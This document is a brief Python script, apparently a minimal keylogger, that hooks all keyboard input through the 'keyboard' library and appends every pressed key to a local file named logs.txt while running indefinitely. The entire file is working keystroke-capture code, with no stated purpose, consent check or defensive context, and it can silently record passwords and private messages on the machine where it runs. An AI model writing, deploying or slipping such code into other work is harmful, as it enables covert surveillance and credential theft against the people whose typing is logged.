import keyboard

def on_key_event(event):
    if event.event_type == keyboard.KEY_DOWN:
        with open('logs.txt', 'a') as logs:
            logs.write(f"{event.name}\n")
            
keyboard.hook(on_key_event)
keyboard.wait('')